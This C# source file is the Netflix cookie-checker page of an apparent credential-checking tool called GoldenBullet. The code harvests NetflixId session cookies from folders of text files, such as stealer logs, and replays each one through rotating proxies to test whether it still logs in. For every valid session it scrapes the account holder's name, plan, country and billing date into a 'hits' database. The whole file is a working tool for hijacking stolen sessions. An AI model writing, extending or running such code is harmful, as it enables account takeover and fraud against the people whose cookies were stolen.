using Core;
using Core.Entities;
using GoldenBullet.Services;
using GoldenBullet.ViewModels;
using GoldenBullet.Views.Dialogs;
using Microsoft.EntityFrameworkCore;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.Win32;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Text.RegularExpressions;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Media;
using System.Windows.Threading;

namespace GoldenBullet.Views.Pages
{
    public partial class NetflixCookiePage : Page
    {
        // Database proxy fields
        private List<ProxyInfo> _databaseProxies = new List<ProxyInfo>();

        private ProxiesViewModel _proxiesVm;
        private readonly ViewModelsService _vmService;
        private bool _isLoadingProxyGroup = false;

        // Stats fields
        private int hits = 0;
        private int fails = 0;
        private int checkedCount = 0;
        private int totalIds = 0;
        private bool isRunning = false;
        private CancellationTokenSource cancellationTokenSource;
        private readonly object lockObj = new object();
        private readonly SynchronizationContext uiContext;
        private readonly Random _random = new Random();

        public NetflixCookiePage()
        {
            InitializeComponent();
            uiContext = SynchronizationContext.Current;
            _vmService = SP.GetService<ViewModelsService>();
            _proxiesVm = _vmService?.Proxies;
            _ = LoadProxyGroupsAsync();
            LoadExistingData();
        }

        private void LoadExistingData()
        {
            Log("Netflix Cookie Checker ready", Colors.White);
            UpdateStats();
        }

        #region Proxy Group Loading (Database)
        private async Task LoadProxyGroupsAsync()
        {
            try
            {
                var scopeFactory = SP.GetService<IServiceScopeFactory>();
                using var scope = scopeFactory.CreateScope();
                var dbContext = scope.ServiceProvider.GetService<ApplicationDbContext>();
                var groups = await dbContext.ProxyGroups.AsNoTracking().OrderBy(g => g.Name).ToListAsync();

                Dispatcher.Invoke(() =>
                {
                    ProxyGroupCombo.Items.Clear();
                    ProxyGroupCombo.Items.Add(new ComboBoxItem
                    {
                        Content = "-- Select group --",
                        Tag = null,
                        IsSelected = true
                    });
                    ProxyGroupCombo.Items.Add(new ComboBoxItem
                    {
                        Content = "All",
                        Tag = "ALL",
                        Foreground = (SolidColorBrush)FindResource("ForegroundWarning")
                    });
                    foreach (var group in groups)
                    {
                        ProxyGroupCombo.Items.Add(new ComboBoxItem
                        {
                            Content = group.Name,
                            Tag = group
                        });
                    }
                });
            }
            catch (Exception ex)
            {
                Log($"Error loading proxy groups: {ex.Message}", Colors.Red);
            }
        }

        private void ProxyGroupCombo_DropDownOpened(object sender, EventArgs e) => LoadProxyGroups();

        private async void LoadProxyGroups()
        {
            try
            {
                var scopeFactory = SP.GetService<IServiceScopeFactory>();
                using var scope = scopeFactory.CreateScope();
                var dbContext = scope.ServiceProvider.GetService<ApplicationDbContext>();
                var groups = await dbContext.ProxyGroups.AsNoTracking().OrderBy(g => g.Name).ToListAsync();

                Dispatcher.Invoke(() =>
                {
                    var previouslySelected = ProxyGroupCombo.SelectedItem as ComboBoxItem;
                    ProxyGroupCombo.Items.Clear();
                    ProxyGroupCombo.Items.Add(new ComboBoxItem
                    {
                        Content = "-- Select group --",
                        Tag = null,
                        IsSelected = previouslySelected?.Tag == null
                    });
                    ProxyGroupCombo.Items.Add(new ComboBoxItem
                    {
                        Content = "All",
                        Tag = "ALL",
                        Foreground = (SolidColorBrush)FindResource("ForegroundWarning")
                    });
                    foreach (var group in groups)
                    {
                        var item = new ComboBoxItem { Content = group.Name, Tag = group };
                        if (previouslySelected?.Tag is ProxyGroupEntity saved && saved.Id == group.Id)
                            item.IsSelected = true;
                        ProxyGroupCombo.Items.Add(item);
                    }
                });
            }
            catch (Exception ex)
            {
                Log($"Error loading proxy groups: {ex.Message}", Colors.Red);
            }
        }

        private async void ProxyGroupCombo_SelectionChanged(object sender, SelectionChangedEventArgs e)
        {
            if (_isLoadingProxyGroup || ProxyGroupCombo.SelectedItem is not ComboBoxItem item) return;

            if (item.Tag?.ToString() == "ALL")
            {
                await LoadAllGroupsProxies();
                return;
            }

            if (item.Tag == null)
            {
                _databaseProxies.Clear();
                UpdateProxyCountLabel(0);
                return;
            }

            if (item.Tag is ProxyGroupEntity group)
            {
                await LoadSingleGroupProxies(group);
            }
        }

        private async Task LoadAllGroupsProxies()
        {
            try
            {
                var scopeFactory = SP.GetService<IServiceScopeFactory>();
                using var scope = scopeFactory.CreateScope();
                var dbContext = scope.ServiceProvider.GetService<ApplicationDbContext>();
                var allGroups = await dbContext.ProxyGroups
                    .AsNoTracking()
                    .Include(g => g.Proxies)
                    .ToListAsync();

                var proxies = new List<ProxyInfo>();
                foreach (var group in allGroups)
                {
                    if (group.Proxies?.Any() == true)
                    {
                        foreach (var proxy in group.Proxies)
                        {
                            var proxyStr = $"{proxy.Host}:{proxy.Port}";
                            if (!string.IsNullOrEmpty(proxy.Username))
                                proxyStr += $":{proxy.Username}:{proxy.Password}";
                            proxies.Add(new ProxyInfo
                            {
                                Raw = proxyStr,
                                Host = proxy.Host,
                                Port = proxy.Port,
                                Username = proxy.Username,
                                Password = proxy.Password
                            });
                        }
                    }
                }

                Dispatcher.Invoke(() =>
                {
                    _databaseProxies = proxies;
                    UpdateProxyCountLabel(proxies.Count);
                });
                Log($"Loaded {proxies.Count} proxies from ALL groups", Colors.Cyan);
            }
            catch (Exception ex)
            {
                Log($"Error loading all proxy groups: {ex.Message}", Colors.Red);
            }
        }

        private async Task LoadSingleGroupProxies(ProxyGroupEntity group)
        {
            try
            {
                var scopeFactory = SP.GetService<IServiceScopeFactory>();
                using var scope = scopeFactory.CreateScope();
                var dbContext = scope.ServiceProvider.GetService<ApplicationDbContext>();
                var loadedGroup = await dbContext.ProxyGroups
                    .AsNoTracking()
                    .Include(g => g.Proxies)
                    .FirstOrDefaultAsync(g => g.Id == group.Id);

                if (loadedGroup?.Proxies?.Any() == true)
                {
                    var proxies = new List<ProxyInfo>();
                    foreach (var proxy in loadedGroup.Proxies)
                    {
                        var proxyStr = $"{proxy.Host}:{proxy.Port}";
                        if (!string.IsNullOrEmpty(proxy.Username))
                            proxyStr += $":{proxy.Username}:{proxy.Password}";
                        proxies.Add(new ProxyInfo
                        {
                            Raw = proxyStr,
                            Host = proxy.Host,
                            Port = proxy.Port,
                            Username = proxy.Username,
                            Password = proxy.Password
                        });
                    }
                    Dispatcher.Invoke(() =>
                    {
                        _databaseProxies = proxies;
                        UpdateProxyCountLabel(proxies.Count);
                    });
                    Log($"Loaded {proxies.Count} proxies from '{loadedGroup.Name}'", Colors.Cyan);
                }
                else
                {
                    Dispatcher.Invoke(() =>
                    {
                        _databaseProxies.Clear();
                        UpdateProxyCountLabel(0);
                    });
                    Log($"Group '{loadedGroup?.Name ?? group.Name}' has no proxies", Colors.Orange);
                }
            }
            catch (Exception ex)
            {
                Log($"Error loading proxy group: {ex.Message}", Colors.Red);
            }
        }

        private void UpdateProxyCountLabel(int count)
        {
            Dispatcher.Invoke(() => ProxyCountLabel.Text = count.ToString());
        }
        #endregion

        #region Event Handlers
        private void InputPathTextBox_TextChanged(object sender, TextChangedEventArgs e)
        {
            if (!isRunning) UpdatePreviewStats();
        }

        private void UpdatePreviewStats()
        {
            var inputPath = InputPathTextBox.Text.Trim();
            if (!string.IsNullOrEmpty(inputPath) && (File.Exists(inputPath) || Directory.Exists(inputPath)))
            {
                var ids = ExtractIds(inputPath);
                totalIds = ids.Count;
            }
            UpdateStats();
        }

        private void BrowseInput_Click(object sender, RoutedEventArgs e)
        {
            var dialog = new OpenFileDialog
            {
                Title = "Select Cookies File or Folder",
                CheckFileExists = false,
                FileName = "Select Folder"
            };
            if (dialog.ShowDialog() == true)
            {
                var path = dialog.FileName.Replace("Select Folder", "").TrimEnd('\\');
                InputPathTextBox.Text = path;
                UpdatePreviewStats();
            }
        }

        private async void StartButton_Click(object sender, RoutedEventArgs e)
        {
            if (!FLS.IsActivated())
            {
                await ShowRequiredDialogAsync();
                if (!FLS.IsActivated())
                {
                    Log("⚠️ Activation required to start checker", Colors.Orange);
                    return;
                }
            }

            if (isRunning) return;

            var inputPath = InputPathTextBox.Text.Trim();
            if (string.IsNullOrEmpty(inputPath) || (!File.Exists(inputPath) && !Directory.Exists(inputPath)))
            {
                MessageBox.Show("Please select a valid input file or folder!", "Error", MessageBoxButton.OK, MessageBoxImage.Warning);
                return;
            }

            // CHECK IF PROXY GROUP WAS SELECTED AND HAS PROXIES
            bool hasProxies = _databaseProxies.Count > 0;

            if (hasProxies)
            {
                Log($"Using {_databaseProxies.Count} proxies from database", Colors.Cyan);
            }
            else
            {
                Log("Checking cookies WITHOUT proxies (direct connection)", Colors.Yellow);
            }

            var netflixIds = ExtractIds(inputPath);
            if (netflixIds.Count == 0)
            {
                MessageBox.Show("No Netflix IDs found!", "Error", MessageBoxButton.OK, MessageBoxImage.Warning);
                return;
            }

            totalIds = netflixIds.Count;
            hits = 0;
            fails = 0;
            checkedCount = 0;
            cancellationTokenSource = new CancellationTokenSource();
            isRunning = true;

            StartButton.IsEnabled = false;
            StopButton.IsEnabled = true;
            ProgressBar.Visibility = Visibility.Visible;
            ProgressBar.Maximum = totalIds;
            ProgressBar.Value = 0;
            StatusLabel.Text = "Running";
            StatusLabel.Foreground = (SolidColorBrush)new BrushConverter().ConvertFromString("#4CAF50");
            UpdateStats();

            Log($"Starting check of {totalIds} IDs with {ThreadsNumericUpDown.Value} threads...", Colors.Cyan);

            try
            {
                await ProcessIds(netflixIds, hasProxies, cancellationTokenSource.Token);
            }
            catch (OperationCanceledException)
            {
                Log("Operation cancelled by user", Colors.Orange);
            }
            catch (Exception ex)
            {
                Log($"Error: {ex.Message}", Colors.Red);
            }
            finally
            {
                isRunning = false;
                Dispatcher.Invoke(() =>
                {
                    StartButton.IsEnabled = true;
                    StopButton.IsEnabled = false;
                    ProgressBar.Visibility = Visibility.Collapsed;
                    StatusLabel.Text = "Completed";
                    StatusLabel.Foreground = (SolidColorBrush)new BrushConverter().ConvertFromString("#FBC02D");
                });
                Log($"Done! Hits: {hits} | Fails: {fails} | Checked: {checkedCount}/{totalIds}", Colors.LimeGreen);
            }
        }

        private async Task ShowRequiredDialogAsync()
        {
            var mainWindow = Application.Current.MainWindow as MainWindow;
            await Application.Current.Dispatcher.InvokeAsync(() =>
            {
                var activationPage = new RequiredDialog();
                var dialog = new MainDialog(activationPage, "Activation Required", 500, 600);
                dialog.Owner = Window.GetWindow(this);
                dialog.WindowStartupLocation = WindowStartupLocation.CenterOwner;
                dialog.ShowDialog();
            });
            if (FLS.IsActivated() && mainWindow != null)
            {
                await mainWindow.Dispatcher.InvokeAsync(() =>
                {
                    mainWindow.CheckLicense();
                    mainWindow.ForceRefresh();
                });
            }
        }

        private void StopButton_Click(object sender, RoutedEventArgs e)
        {
            cancellationTokenSource?.Cancel();
            StatusLabel.Text = "Stopping...";
            StatusLabel.Foreground = (SolidColorBrush)new BrushConverter().ConvertFromString("#F44336");
        }

        private void ClearLog_Click(object sender, RoutedEventArgs e)
        {
            LogTextBox.Clear();
        }
        #endregion

        #region ID Extraction
        private List<string> ExtractIds(string path)
        {
            var ids = new HashSet<string>();
            var files = File.Exists(path)
                ? new[] { path }
                : Directory.GetFiles(path, "*.txt", SearchOption.AllDirectories);

            var patterns = new[]
            {
                new Regex(@"(?i)(?<!Secure)NetflixId\s*[:=]?\s*([^;|\s]+)"),
                new Regex(@"(?i)(?:CookieID|Cookie)\s*[:=]?\s*([^;|\s]+)"),
                new Regex(@"(?i)LoginCookie\s*[:=]?\s*(.+?)(?:\||$)"),
                new Regex(@"(?i)NetflixId=([^;|\s]+)")
            };

            foreach (var file in files)
            {
                try
                {
                    var content = File.ReadAllText(file);
                    foreach (var pattern in patterns)
                    {
                        var matches = pattern.Matches(content);
                        foreach (Match match in matches)
                        {
                            var cleaned = match.Groups[match.Groups.Count - 1].Value.Trim();
                            cleaned = cleaned.Split('=').Last().TrimStart(':').Split(';')[0].Replace(" ", "");
                            if (!string.IsNullOrEmpty(cleaned) && cleaned.Length > 5)
                                ids.Add(cleaned);
                        }
                    }
                }
                catch (Exception ex)
                {
                    Log($"Error reading {file}: {ex.Message}", Colors.Red);
                }
            }

            return ids.ToList();
        }
        #endregion

        #region Processing
        private async Task ProcessIds(List<string> ids, bool useProxies, CancellationToken ct)
        {
            var semaphore = new SemaphoreSlim((int)ThreadsNumericUpDown.Value);
            var tasks = new List<Task>();

            foreach (var id in ids)
            {
                if (ct.IsCancellationRequested) break;
                await semaphore.WaitAsync(ct);
                var task = Task.Run(async () =>
                {
                    try
                    {
                        await CheckId(id, ct, useProxies);
                    }
                    finally
                    {
                        semaphore.Release();
                    }
                }, ct);
                tasks.Add(task);
            }
            await Task.WhenAll(tasks);
        }

        private async Task CheckId(string netflixId, CancellationToken ct, bool useProxies)
        {
            var displayId = netflixId.Length <= 30 ? netflixId : netflixId.Substring(0, 30) + "...";

            // Keep trying until we get VALID or FAIL - NO proxy errors counted
            while (!ct.IsCancellationRequested)
            {
                ProxyInfo proxy = null;

                if (useProxies && _databaseProxies.Count > 0)
                {
                    lock (lockObj)
                    {
                        if (_databaseProxies.Count > 0)
                            proxy = _databaseProxies[_random.Next(_databaseProxies.Count)];
                    }
                }

                try
                {
                    using (var handler = new HttpClientHandler
                    {
                        AllowAutoRedirect = true,
                        CookieContainer = new CookieContainer()
                    })
                    {
                        if (proxy != null)
                        {
                            try
                            {
                                var proxyUri = new Uri($"http://{proxy.Host}:{proxy.Port}");
                                var webProxy = new WebProxy(proxyUri);
                                if (!string.IsNullOrEmpty(proxy.Username))
                                {
                                    webProxy.Credentials = new NetworkCredential(proxy.Username, proxy.Password ?? string.Empty);
                                }
                                handler.Proxy = webProxy;
                                handler.UseProxy = true;
                            }
                            catch
                            {
                                handler.UseProxy = false;
                            }
                        }

                        handler.CookieContainer.Add(new Uri("https://www.netflix.com"),
                            new Cookie("NetflixId", netflixId) { Domain = ".netflix.com" });

                        using (var client = new HttpClient(handler))
                        {
                            client.DefaultRequestHeaders.Add("User-Agent",
                                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36");
                            client.Timeout = TimeSpan.FromSeconds(10);

                            var browseResponse = await client.GetAsync("https://www.netflix.com/browse", ct);
                            var finalUrl = browseResponse.RequestMessage.RequestUri.ToString().ToLower();

                            if (finalUrl.Contains("login") || finalUrl.Contains("unsupportedbrowser"))
                            {
                                Log($"✗ {displayId} -> FAIL", Colors.Red);
                                IncrementChecked();
                                IncrementFails();
                                return;
                            }

                            if (finalUrl.Contains("browse"))
                            {
                                var accountResponse = await client.GetAsync("https://www.netflix.com/account", ct);
                                var accountHtml = await accountResponse.Content.ReadAsStringAsync();
                                var info = ExtractAccountInfo(accountHtml);

                                lock (lockObj)
                                {
                                    hits++;
                                }

                                var proxyUsed = proxy?.Raw ?? "None";
                                await SaveHitToDatabase(netflixId, info, proxyUsed);

                                var countryMatch = Regex.Match(info, @"countryOfSignup:\s*([^|]+)");
                                var qualityMatch = Regex.Match(info, @"videoQuality:\s*([^|]+)");
                                var country = countryMatch.Success ? countryMatch.Groups[1].Value.Trim() : "(unknown)";
                                var quality = qualityMatch.Success ? qualityMatch.Groups[1].Value.Trim() : "(unknown)";

                                Log($"✓ {displayId} -> VALID | countryOfSignup: {country} | videoQuality: {quality}", Colors.LimeGreen);
                                IncrementChecked();
                                return;
                            }

                            Log($"✗ {displayId} -> FAIL (Unknown)", Colors.Red);
                            IncrementChecked();
                            IncrementFails();
                            return;
                        }
                    }
                }
                catch (Exception)
                {
                    // Proxy error - DON'T count as checked, just try another proxy (or direct if no proxy)
                    continue;
                }
            }
        }
        #endregion

        #region Account Info Extraction
        private string ExtractAccountInfo(string html)
        {
            string accountName = "(unknown)";
            string membershipStatus = "(unknown)";
            string country = "(unknown)";
            string planName = "(unknown)";
            string videoQuality = "(unknown)";
            string nextBilling = "(unknown)";

            var match1 = Regex.Match(html, "\"userInfo\"\\s*:\\s*\\{\\s*\"name\"\\s*:\\s*\"([^\"]+)\"", RegexOptions.IgnoreCase);
            if (match1.Success) accountName = DecodeField(match1.Groups[1].Value);

            var match2 = Regex.Match(html, "\"membershipStatus\"\\s*:\\s*\"([^\"]+)\"", RegexOptions.IgnoreCase);
            if (match2.Success) membershipStatus = DecodeField(match2.Groups[1].Value);

            var match3 = Regex.Match(html, "countryOfSignup\"\\s*:\\s*\"([^\"]+)\"", RegexOptions.IgnoreCase);
            if (match3.Success) country = DecodeField(match3.Groups[1].Value);

            var match4 = Regex.Match(html, "GrowthPlan\",\"name\":\"([^\"]+)\"", RegexOptions.IgnoreCase);
            if (match4.Success) planName = DecodeField(match4.Groups[1].Value);

            var match5 = Regex.Match(html, "videoQuality\":\\{\"fieldType\":\"String\",\"value\":\"([^\"]+)\"", RegexOptions.IgnoreCase);
            if (match5.Success) videoQuality = DecodeField(match5.Groups[1].Value);

            var match6 = Regex.Match(html, "nextBillingDate\":\\{\"fieldType\":\"String\",\"value\":\"([^\"]+)\"", RegexOptions.IgnoreCase);
            if (match6.Success) nextBilling = DecodeField(match6.Groups[1].Value);

            return string.Concat(
                "name=", accountName,
                " | membershipStatus: ", membershipStatus,
                " | countryOfSignup: ", country,
                " | Plan: ", planName,
                " | videoQuality: ", videoQuality,
                " | nextBillingDate: ", nextBilling);
        }

        private string DecodeField(string value)
        {
            if (string.IsNullOrEmpty(value))
                return "(unknown)";
            try
            {
                value = Regex.Unescape(value);
            }
            catch { }
            return value.Replace("\\x20", " ").Replace("\\u0020", " ").Trim();
        }
        #endregion

        #region Database Operations
        private async Task SaveHitToDatabase(string netflixId, string info, string proxyUsed)
        {
            try
            {
                var vmService = SP.GetService<ViewModelsService>();
                var hitsVM = vmService.Hits;
                var hit = new HitEntity
                {
                    Data = "NetflixId=" + netflixId,
                    Type = "SUCCESS",
                    ConfigName = "NetflixCookie",
                    Date = DateTime.Now,
                    WordlistName = "NetflixCookieChecker",
                    Proxy = proxyUsed ?? "None",
                    CapturedData = info + " | ConfigBy: Core"
                };
                await hitsVM.AddHitAsync(hit);
            }
            catch (Exception ex)
            {
                Log($"Failed to save hit to database: {ex.Message}", Colors.Orange);
            }
        }
        #endregion

        #region Logging & Stats
        private void Log(string message, Color? color = null)
        {
            uiContext.Post(_ =>
            {
                LogTextBox.Append(message, color ?? Colors.White);
            }, null);
        }

        private void IncrementChecked()
        {
            lock (lockObj)
            {
                checkedCount++;
            }
            uiContext.Post(_ => UpdateStats(), null);
        }

        private void IncrementFails()
        {
            lock (lockObj)
            {
                fails++;
            }
            uiContext.Post(_ => UpdateStats(), null);
        }

        private void UpdateStats()
        {
            Dispatcher.Invoke(() =>
            {
                TotalCountLabel.Text = totalIds.ToString();
                CheckedCountLabel.Text = checkedCount.ToString();
                HitsCountLabel.Text = hits.ToString();
                FailsCountLabel.Text = fails.ToString();
                var rate = checkedCount > 0 ? (double)hits / checkedCount * 100 : 0;
                SuccessRateLabel.Text = $"{rate:F1}%";
                ThreadsLabel.Text = ThreadsNumericUpDown.Value.ToString();
                if (totalIds > 0)
                {
                    ProgressBar.Value = checkedCount;
                }
            });
        }
        #endregion
    }
}
